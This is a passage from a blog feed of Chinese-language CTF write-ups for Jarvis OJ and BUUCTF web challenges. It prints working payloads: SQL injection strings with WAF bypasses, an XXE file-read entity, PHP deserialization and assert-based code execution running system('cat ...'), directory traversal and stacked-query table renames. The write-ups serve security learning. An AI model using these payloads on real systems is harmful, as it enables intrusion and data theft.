class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&#x27;&#x27;</span></span>) </span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">$this</span> -&gt; file = <span class=\"hljs-variable\">$filename</span>;<br>\t\t&#125;<br>\t\t<br>\t\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readfile</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;..&#x27;</span>)===<span class=\"hljs-literal\">FALSE</span>  <br>\t\t\t&amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;/&#x27;</span>)===<span class=\"hljs-literal\">FALSE</span> &amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>)==<span class=\"hljs-literal\">FALSE</span>) &#123;<br>\t\t\t\t<span class=\"hljs-keyword\">return</span> @file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;file);<br>\t\t\t&#125;<br>\t\t&#125;<br>\t&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Shield</span></span>&#123;<br>\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>=<span class=\"hljs-string\">&#x27;pctf.php&#x27;</span>;<br>&#125;<br><span class=\"hljs-variable\">$c</span> = <span class=\"hljs-keyword\">new</span> Shield();<br><span class=\"hljs-keyword\">echo</span> serialize(<span class=\"hljs-variable\">$c</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>“view-source:<a href=\"http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:%7Bs:4:%22file%22;s:8:%22pctf.php%22;%7D&quot;\">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}&quot;</a><br>就拿到了flag</p>\n<h2 id=\"Login\"><a href=\"#Login\" class=\"headerlink\" title=\"Login\"></a>Login</h2><p>提示说需要密码才能拿到flag，，但是测试了一下发现当输入双引号的时候会报sql错误，应该是存在sql注入，但是测试了好久没发现有什么用，，看了一眼wp要先抓包，，在head里面有hint。。。<br>‘Hint: “select * from <code>admin</code> where password=’”.md5($pass,true).”‘“‘<br>然后想到应该是md5的安全问题，0e开头的问题应该是不存在，参考了一下<a href=\"https://www.cnblogs.com/piaomiaohongchen/p/10659359.html\">https://www.cnblogs.com/piaomiaohongchen/p/10659359.html</a><br>试了一下文中给出的密码ffifdyop就拿到了flag</p>\n<h2 id=\"admin\"><a href=\"#admin\" class=\"headerlink\" title=\"admin\"></a>admin</h2><p>打开网页只有一个hello world，查看网页源代码没看到啥有用的东西，于是就看看有没有robots.txt，看到了admin_s3cr3t.php，访问拿到假的flag，想了想应该是跟cookie有关，于是就抓包看看，应该是在cookie有判断是不是admin，但是我抓到的包没有cookie，反而是看到一个类似于base64的一串编码，就一直在搞这个也没搞出个啥，后来看了一下wp别人就有抓到admin=0.。。。我就重新刷新重新抓了一下包才看到了这玩意，，改成1就拿到了flag，看来应该是还没有设置cookie就被我抓包了，，，害，下次注意</p>\n<h2 id=\"IN-A-mess\"><a href=\"#IN-A-mess\" class=\"headerlink\" title=\"IN A mess\"></a>IN A mess</h2><p>1.查看网页源代码让我访问index.phps，看到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;!--index.phps--&gt;&quot;</span>;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])<br>&#123;<br>\theader(<span class=\"hljs-string\">&#x27;Location: index.php?id=1&#x27;</span>);<br>\t<span class=\"hljs-keyword\">exit</span>();<br>&#125;<br><span class=\"hljs-variable\">$id</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><span class=\"hljs-variable\">$a</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>];<br><span class=\"hljs-variable\">$b</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>];<br><span class=\"hljs-keyword\">if</span>(stripos(<span class=\"hljs-variable\">$a</span>,<span class=\"hljs-string\">&#x27;.&#x27;</span>))<br>&#123;<br>\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;Hahahahahaha&#x27;</span>;<br>\t<span class=\"hljs-keyword\">return</span> ;<br>&#125;<br><span class=\"hljs-variable\">$data</span> = @file_get_contents(<span class=\"hljs-variable\">$a</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>);<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$data</span>==<span class=\"hljs-string\">&quot;1112 is a nice lab!&quot;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$id</span>==<span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> strlen(<span class=\"hljs-variable\">$b</span>)&gt;<span class=\"hljs-number\">5</span> <span class=\"hljs-keyword\">and</span> eregi(<span class=\"hljs-string\">&quot;111&quot;</span>.substr(<span class=\"hljs-variable\">$b</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-string\">&quot;1114&quot;</span>) <span class=\"hljs-keyword\">and</span> substr(<span class=\"hljs-variable\">$b</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>)!=<span class=\"hljs-number\">4</span>)<br>&#123;<br>\t<span class=\"hljs-keyword\">require</span>(<span class=\"hljs-string\">&quot;flag.txt&quot;</span>);<br>&#125;<br><span class=\"hljs-keyword\">else</span><br>&#123;<br>\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">&quot;work harder!harder!harder!&quot;</span>;<br>&#125;<br><br><br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>可以看到主要就是那一层if</p>\n<ol>\n<li>$data用php://input传进去</li>\n<li>id=0</li>\n<li>b长度要大于5但是要满足第二、三层要长度为0，这时候就要让b=%0011111，strlen不会被截断，substr会被截断</li>\n<li>然后让我们访问<a href=\"http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1%EF%BC%8C%E5%8F%88%E7%9C%8B%E5%88%B0%E4%BA%86id=1%EF%BC%8C%E6%9C%89%E5%8F%AF%E8%83%BD%E6%98%AF%E6%B3%A8%E5%85%A5\">http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1，又看到了id=1，有可能是注入</a></li>\n<li>用单引号测试发现直接返回了sql语句，那看来应该就是sql注入了</li>\n<li>测试发现过滤了空格这个可以用注释符/**/绕过，但是发现直接用会被过滤，试着往里面加点东西就好了</li>\n<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#</code>测试得到字段数为3</li>\n<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()/*1*/#</code>拿到数据库名是test</li>\n<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#</code>拿到表名content</li>\n<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#</code>得到字段名是id,context,title</li>\n<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content#</code>拿到flag</li>\n</ol>\n<h2 id=\"api调用\"><a href=\"#api调用\" class=\"headerlink\" title=\"api调用\"></a>api调用</h2><p>由于默认传输是json格式，先抓包把格式改成xml，然后传payload<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;  &lt;!DOCTYPE foo [  &lt;!ENTITY myentity SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;  &lt;abc&gt;&amp;myentity;&lt;/abc&gt;</code>就拿到了flag</p>\n<h2 id=\"WEB？\"><a href=\"#WEB？\" class=\"headerlink\" title=\"WEB？\"></a>WEB？</h2><p>一开始还看不懂题目要干嘛，然后查看源代码看到一堆Js，然后用谷歌插件美化一下（安利一下JavaScript and CSS Code Beautifier），方便看代码。然后发现有两万行的代码。。。。看WP知道了用password关键词来开始审计。大概就是矩阵A*B=C,已知B，C求A。（线代知识早就忘得差不多了）</p>\n<h2 id=\"babyphp\"><a href=\"#babyphp\" class=\"headerlink\" title=\"babyphp\"></a>babyphp</h2><p>攻防世界原题，先是githack拿到源码，然后assert任意代码执行拿到flag，用’)闭合然后任意执行代码<br>payload：<code>?page=2&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></p>\n<h2 id=\"inject\"><a href=\"#inject\" class=\"headerlink\" title=\"inject\"></a>inject</h2><p>提示说先拿到源码再说，看了WP知道要试常见的备份文件名，常见的备份文件临时文件名，比如.bak、.swp、.save、<del>等，然后这一题是在index.php</del>…..拿到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">require</span>(<span class=\"hljs-string\">&quot;config.php&quot;</span>);<br><span class=\"hljs-variable\">$table</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;table&#x27;</span>]?<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;table&#x27;</span>]:<span class=\"hljs-string\">&quot;test&quot;</span>;<br><span class=\"hljs-variable\">$table</span> = Filter(<span class=\"hljs-variable\">$table</span>);<br>mysqli_query(<span class=\"hljs-variable\">$mysqli</span>,<span class=\"hljs-string\">&quot;desc `secret_<span class=\"hljs-subst\">&#123;$table&#125;</span>`&quot;</span>) <span class=\"hljs-keyword\">or</span> Hacker();<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;select &#x27;flag&#123;xxx&#125;&#x27; from secret_<span class=\"hljs-subst\">&#123;$table&#125;</span>&quot;</span>;<br><span class=\"hljs-variable\">$ret</span> = sql_query(<span class=\"hljs-variable\">$sql</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$ret</span>[<span class=\"hljs-number\">0</span>];<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>应该是sql注入的题目，先是要成功执行desc <code>secret_&#123;$table&#125;</code>，然后利用下面的sql语句拿到flag。desc table_name需要表存在，这样就限制了注入，因此应该就是要在这里下功夫。<br>因为desc <code>test</code> <code>aaa</code>,只要第一个表存在就会执行，但是如果是单引号就不会执行，这一要考核的应该就是这个点。然后就可以构造payload：”?table=test<code> </code>union select database() limit 1,1”拿到数据库名61d300，注意要加limit，不然直会返回D。然后构造payload：“?table=test<code> </code>union select table_name from information_schema.tables where table_schema=0x363164333030 limit 1,1”，拿到表名secret_flag，注意用十六进制过waf。同样办法拿到列名flagUwillNeverKnow，然后拿到flag：flag{luckyGame~}</p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><p>session的序列化方法不同导致的漏洞，还有就是如何往session里加入payload</p>\n<h2 id=\"RE？\"><a href=\"#RE？\" class=\"headerlink\" title=\"RE？\"></a>RE？</h2><p>下载了个udf.so文件，不知道这是啥就上网搜了一下，<a href=\"https://www.cnblogs.com/sijidou/p/10522972.html\">https://www.cnblogs.com/sijidou/p/10522972.html</a></p>\n<h2 id=\"flag在管理员手里\"><a href=\"#flag在管理员手里\" class=\"headerlink\" title=\"flag在管理员手里\"></a>flag在管理员手里</h2><p>先抓个包，看到cookie里有一个admin=0，改成1不行，还有一个字符串，url解码以后发现是s:5:”guest”;试一下改成admin很显然也是不行的，还有就是一个哈希值，估计直接爆破也是不行的，到这里就断了思路。然后看WP说找源码，一样的index.php~拿到一个实质为.swp的vim异常退出文件，然后就分析一下源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <br>\t<span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">false</span>;<br>\t<span class=\"hljs-variable\">$role</span> = <span class=\"hljs-string\">&quot;guest&quot;</span>;<br>\t<span class=\"hljs-variable\">$salt</span> = <br>\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>])) &#123;<br>\t    <span class=\"hljs-variable\">$role</span> = unserialize(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>]);<br>\t    <span class=\"hljs-variable\">$hsh</span> = <span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;hsh&quot;</span>];<br>\t    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$role</span>===<span class=\"hljs-string\">&quot;admin&quot;</span> &amp;&amp; <span class=\"hljs-variable\">$hsh</span> === md5(<span class=\"hljs-variable\">$salt</span>.strrev(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>]))) &#123;<br>\t        <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">true</span>;<br>\t    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t        <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">false</span>;<br>\t    &#125;<br>\t&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t    <span class=\"hljs-variable\">$s</span> = serialize(<span class=\"hljs-variable\">$role</span>);<br>\t    setcookie(<span class=\"hljs-string\">&#x27;role&#x27;</span>,<span class=\"hljs-variable\">$s</span>);<br>\t    <span class=\"hljs-variable\">$hsh</span> = md5(<span class=\"hljs-variable\">$salt</span>.strrev(<span class=\"hljs-variable\">$s</span>));<br>\t    setcookie(<span class=\"hljs-string\">&#x27;hsh&#x27;</span>,<span class=\"hljs-variable\">$hsh</span>);<br>\t&#125;<br>\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$auth</span>) &#123;<br>\t    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span><br><span class=\"hljs-string\">\t&#125; else &#123;</span><br><span class=\"hljs-string\">\t    echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class=\"hljs-string\">&quot;;</span><br><span class=\"hljs-string\">\t&#125;</span><br><span class=\"hljs-string\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>可以看到哈希值是md5(salt+反向“admin”)；应该是哈希的某种攻击方法。了解到应该可以进行哈希长度拓展攻击。<br>（参考<a href=\"https://www.cnblogs.com/pcat/p/5478509.html%EF%BC%89\">https://www.cnblogs.com/pcat/p/5478509.html）</a><br>PCTF{H45h_ext3ndeR_i5_easy_to_us3}</p>\n<h2 id=\"Chopper\"><a href=\"#Chopper\" class=\"headerlink\" title=\"Chopper\"></a>Chopper</h2><p>进入管理员登陆界面，查看源代码发现“admin ip is 202.5.19.128”；</p>\n<h2 id=\"Simple-Injection\"><a href=\"#Simple-Injection\" class=\"headerlink\" title=\"Simple Injection\"></a>Simple Injection</h2><p>发现当输入的账号是admin的时候回显是密码错误，输入其他账户的时候回显是密码错误。当账户名用admin’ #发现可以但是用admin’ and 1=1 #时被过滤了，再试一下<code>admin&#39;/**/and/**/</code>发现没有被过滤，也就是这里存在注入点，根据回显可以尝试bool盲注或者时间盲注。<br>不过看了WP才发现还有一种更简单的方法<br>直接用payload<code>username=miracle778&#39;/**/union(select(md5(&#39;123&#39;)))#&amp;password=123</code>就能拿到flag</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/11/20/BUUCTF-WP/",
            "url": "http://blog.m1n.me/2019/11/20/BUUCTF-WP/",
            "title": "BUUCTF-WP",
            "date_published": "2019-11-20T14:49:13.000Z",
            "content_html": "<p>BUUCTF部分题解<br>OJ链接<a href=\"https://buuoj.cn/challenges\">https://buuoj.cn/challenges</a></p>\n<span id=\"more\"></span>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"HCTF-2018-WarmUp\"><a href=\"#HCTF-2018-WarmUp\" class=\"headerlink\" title=\"[HCTF 2018]WarmUp\"></a>[HCTF 2018]WarmUp</h2><ol>\n<li>先查看网页源代码，发现source.php，就读到了源码，然后还有一个hint.php可以看到flag在ffffllllaaaagggg</li>\n<li>分析一下源码：<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\">$_page = mb_substr(<br>                $page,<br>                <span class=\"hljs-number\">0</span>,<br>                mb_strpos($page . <span class=\"hljs-string\">&#x27;?&#x27;</span>, <span class=\"hljs-string\">&#x27;?&#x27;</span>)<br>            )<span class=\"hljs-comment\">;</span><br></code></pre></td></tr></table></figure>\n可以看到它是根据?的位置来截取，因此可以构造paylaod：<code>?file=hint.php?../../../../../../../ffffllllaaaagggg</code>就读到了flag<h2 id=\"强网杯-2019-随便注\"><a href=\"#强网杯-2019-随便注\" class=\"headerlink\" title=\"[强网杯 2019]随便注\"></a>[强网杯 2019]随便注</h2></li>\n<li>先用单引号闭合，发现报错，然后用order by测试出字段数为2，再尝试union注入发现过滤：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</code></li>\n<li>payload:<code>1&#39;;show databases #</code>拿到数据库名<br>array(1) {<br> [0]=&gt;<br> string(11) “ctftraining”<br>}</li>\n</ol>\n<p>array(1) {<br>  [0]=&gt;<br>  string(18) “information_schema”<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(5) “mysql”<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(18) “performance_schema”<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(9) “supersqli”<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(4) “test”<br>}<br>3. <code>1&#39;; show tables from ctftraining #</code>拿到表名<br>array(1) {<br>    [0]=&gt;<br>    string(10) “FLAG_TABLE”<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(4) “news”<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(5) “users”<br>}<br>4. <code>1&#39;;show columns from ctftraining.FLAG_TABLE #</code>发现不行，被过滤了？？<br>5. <code>1&#39;;show tables #</code>看到有两个表</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(16) “1919810931114514”<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(5) “words”<br>}<br>6. 分别查看words和1919810931114514里面有些什么  </p>\n<p> <code>1&#39;;show columns from words #</code>:array(6) {<br>  [0]=&gt;<br>  string(2) “id”<br>  [1]=&gt;<br>  string(7) “int(10)”<br>  [2]=&gt;<br>  string(2) “NO”<br>  [3]=&gt;<br>  string(0) “”<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) “”<br>}</p>\n<p>array(6) {<br>  [0]=&gt;<br>  string(4) “data”<br>  [1]=&gt;<br>  string(11) “varchar(20)”<br>  [2]=&gt;<br>  string(2) “NO”<br>  [3]=&gt;<br>  string(0) “”<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) “”<br>}<br><code>1&#39;;show columns from </code>1919810931114514<code> #</code>（注意这里要加反引号）：array(6) {<br>  [0]=&gt;<br>  string(4) “flag”<br>  [1]=&gt;<br>  string(12) “varchar(100)”<br>  [2]=&gt;<br>  string(2) “NO”<br>  [3]=&gt;<br>  string(0) “”<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) “”<br>}看到了有flag<br>7. 接下来怎么读到flag就是关键了</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">1</span>&#x27;; alter table <span class=\"hljs-built_in\">words</span> rename <span class=\"hljs-keyword\">to</span> words1;alter table `<span class=\"hljs-number\">1919810931114514</span>` rename <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> change flag <span class=\"hljs-built_in\">id</span> varchar(<span class=\"hljs-number\">50</span>);<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">1</span>&#x27;; alter table <span class=\"hljs-built_in\">words</span> rename <span class=\"hljs-keyword\">to</span> words1;alter table `<span class=\"hljs-number\">1919810931114514</span>` rename <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> add <span class=\"hljs-built_in\">id</span> int;a;ter table <span class=\"hljs-built_in\">words</span> alter <span class=\"hljs-built_in\">id</span> <span class=\"hljs-keyword\">set</span> default <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<p>然后用<code>1&#39;or 1=1 #</code>拿到flag</p>\n<p>另payload：</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smali\">1&#x27;;<br>SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;<br>prepare execsql from @a;<span class=\"hljs-built_in\"></span><br><span class=\"hljs-built_in\">execute </span>execsql;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h2><p>SSTI，handler.settings拿secret-cookie</p>\n<h2 id=\"极客大挑战-2019-EasySQL\"><a href=\"#极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]EasySQL\"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码直接拿flag</p>\n<h2 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源代码发现/calc.php?num=，访问calc.php拿到源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-variable\">$str</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>];<br>        <span class=\"hljs-variable\">$blacklist</span> = [<span class=\"hljs-string\">&#x27; &#x27;</span>, <span class=\"hljs-string\">&#x27;\\t&#x27;</span>, <span class=\"hljs-string\">&#x27;\\r&#x27;</span>, <span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"hljs-string\">&#x27;&quot;&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;\\[&#x27;</span>, <span class=\"hljs-string\">&#x27;\\]&#x27;</span>,<span class=\"hljs-string\">&#x27;\\$&#x27;</span>,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>,<span class=\"hljs-string\">&#x27;\\^&#x27;</span>];<br>        <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$blacklist</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$blackitem</span>) &#123;<br>                <span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&#x27;/&#x27;</span> . <span class=\"hljs-variable\">$blackitem</span> . <span class=\"hljs-string\">&#x27;/m&#x27;</span>, <span class=\"hljs-variable\">$str</span>)) &#123;<br>                        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;echo &#x27;</span>.<span class=\"hljs-variable\">$str</span>.<span class=\"hljs-string\">&#x27;;&#x27;</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n\n<p>php的解析规则，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析,也就是说我们只需要用<code>? num=</code>就可以绕过waf的检测，但是这样只能绕过waf但是并不能绕过黑名单检测。用chr(47)绕过<code>\\</code>检测。</p>\n<h2 id=\"HCTF-2018-admin\"><a href=\"#HCTF-2018-admin\" class=\"headerlink\" title=\"[HCTF 2018]admin\"></a>[HCTF 2018]admin</h2><p>出题人WP：”<a href=\"https://www.ckj123.com/?p=147&quot;\">https://www.ckj123.com/?p=147&quot;</a></p>\n<p>修改密码页面注释有git源码泄露，<a 